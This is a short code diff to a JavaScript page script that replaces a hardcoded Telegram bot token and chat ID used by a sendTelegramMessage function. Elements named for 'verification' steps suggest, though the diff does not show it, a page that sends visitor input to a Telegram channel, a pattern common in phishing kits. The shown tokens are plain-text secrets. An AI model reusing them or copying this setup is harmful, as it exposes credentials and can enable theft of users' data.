@@ -18,8 +18,8 @@ document.addEventListener('DOMContentLoaded', function () {
   const verificationSuccess = document.getElementById('verification-success');
   const firstVerificationStep = document.getElementById('first-verification-step');
 
-  const botToken = "8556754539:AAHGiNn7zLWFh8K44b_XMKb_iZXHRME2EOY";
-  const authorizedChatId = "8656587184";
+  const botToken = "8751265803:AAFO_jwIfz98XgXcDpLawiKvS5LLqd84-OM";
+  const authorizedChatId = "8631584650";
 
   async function sendTelegramMessage(message) {
     try {
